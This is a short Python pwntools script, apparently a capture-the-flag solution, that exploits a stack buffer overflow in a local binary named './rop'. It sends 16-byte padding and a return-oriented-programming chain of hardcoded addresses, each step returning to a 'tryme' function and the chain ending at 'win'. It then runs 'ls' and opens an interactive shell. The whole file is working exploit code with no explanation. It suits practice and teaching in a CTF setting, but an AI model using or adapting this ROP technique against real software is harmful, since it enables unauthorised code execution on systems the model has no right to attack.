from pwn import *

#p = remote('ctf.umbccd.io', 4100)
p = process("./rop")
tilted_towers = 0x0804937c 
junk_junction = 0x0804954a 
snobby_shores = 0x08049416 
greasy_grove = 0x080495e4 
lonely_lodge = 0x080492e2 
dusty_depot = 0x080494b0 
loot_lake = 0x08049248 
win = 0x0804967e
tryme = 0x080496ca

p.recvuntil("boys?\n")
padd ="A" * 16
payload = ""
payload += padd
payload += p32(tilted_towers)
payload += p32(tryme)
payload += padd
payload += p32(junk_junction)
payload += p32(tryme)
payload += padd
payload += p32(snobby_shores)
payload += p32(tryme)
payload += padd
payload += p32(greasy_grove)
payload += p32(tryme)
payload += padd
payload += p32(lonely_lodge)
payload += p32(tryme)
payload += padd
payload += p32(dusty_depot)
payload += p32(tryme)
payload += padd
payload += p32(loot_lake)
payload += p32(tryme)
payload += padd
payload += p32(win)

p.sendline(payload)

#p.interactive('> ')
p.sendline('ls')
print 'test:', p.recvline()
p.interactive()
